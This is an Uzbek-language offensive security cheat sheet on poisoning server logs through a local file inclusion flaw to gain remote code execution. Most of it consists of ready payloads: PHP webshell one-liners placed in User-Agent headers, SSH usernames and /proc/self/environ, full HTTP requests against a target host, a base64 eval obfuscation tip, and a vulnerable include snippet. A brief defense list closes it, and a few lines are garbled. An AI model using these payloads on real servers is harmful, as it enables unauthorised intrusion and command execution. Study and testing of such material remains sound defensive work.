# Log Poisoning → RCE (Log Injection)

## 1. Ta'rif
Log poisoning — server log'iga PHP kodi (User-Agent, Referer, X-Forwarded-For, username) orqali kiritiladi (injection), keyin LFI bilan o'sha log include qilinadi → RCE. LFI bor bo'lsa va log'ga yozish mumkin bo'lsa — webshell.

## 2. Qayerdan kelib chiqadi
- Log file'larida attacker nazorat qiladigan field: User-Agent, Referer, X-Forwarded-For, header, COOKIE, username
- LFI: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/auth.log`, `/proc/self/environ`
- Server log'ni yozayotganda xom ma'lumot (no sanitize) → log file ichiga PHP tag yoziladi

## 3. Turlari
| Tur | Log joyi |
|-----|----------|
| Apache | `/var/log/apache2/access.log`, `/var/log/httpd/access_log` |
| Nginx | `/var/log/nginx/access.log`, `/var/log/nginx/error.log` |
| Auth | `/var/log/auth.log` (OpenSSH user) |
| Mail | `/var/log/mail.log` |
| /proc environ | `/proc/self/environ` (apache env) |
| Session file | PHP session `/var/lib/php/sessions/sess_<SID>` |
| User-added logs | app custom log |

## 4. Metodologiya
1. LFI bor ekanini toping (lfi/note) — e.g. `page=../../../../var/log/apache2/access.log`.
2. Log'ga PHP kiritish:
   - User-Agent: `<?php system($_GET['c']); ?>`
   - Yoki `<?php echo shell_exec($_GET[0]); ?>`
3. LFI bilan log'ni o'qing — PHP run bo'ladi:
   - `page=...../var/log/apache2/access.log&c=id`
   - Response'da `id` output.
4. Headers'lar (UA, X-Forwarded-For, Referer) ham try — qaysi log'ga tushishini bilgan.
5. `mail` log (username), `auth.log` (ssh user), `proftpd` — qaysi fayl.
6. Session poisoning: session file'ga username orqali (else).
7. Bash history / `/proc` — bir xil.

## 5. Payload'lar
```
# User-Agent injection
User-Agent: <?php system($_GET['c']); ?>

# PoC oddiy
User-Agent: <?php phpinfo(); ?>
```
```
# LFI log read (payload with c)
GET /index.php?page=/var/log/apache2/access.log&c=id HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['c']); ?>

# auth.log
GET /index.php?page=/var/log/auth.log&c=id HTTP/1.1
# ssh user:
ssh '<?php system($_GET["c"]); ?>'@target.com

# /proc/self/environ (UA kernelda)
GET /index.php?page=/proc/self/environ&c=id HTTP/1.1
User-Agent: <?php system($_GET['c']); ?>
```
## 6. Zaif code misollari
```php
// LFI (zaif): 
$page = $_GET['page']; include($page);
// web server apache log (access.log) HTML qolgan raw modda
```
## 7. Nimalarga ahamiyat berish (checklist)
- [ ] LFI + log yoziladigan input (UA/Referer/XFF)
- [ ] Log path'larni brute — /var/log path "humans should run"
- [ ] `include` yoki file content read — include bo'lmasa RCE bo'lmaydi
- [ ] PHP tag'lar blok bo'lsa: `<?=` qisqa o'rniga, `<?php` (short tag off)
- [ ] base64 obfuscate: `<?php eval(base64_decode('...')); ?>`
- [ ] Access log: URL'da ham — `<a>` to'g'risiga hammasi URL encode bo'ladi
- [ ] Afrika: WAF — UA'ni allow
- [ ] Custom app logs (product query array) — body
## 8. Himoya
- LFI yopish (whitelist/include only, never user path directly)
- Log'da newline/< sanitized — encode before write
- `open_basedir`, allow_url_include off, dedicated log path no-exec
- Never include user-controlled files (uploads) — serve static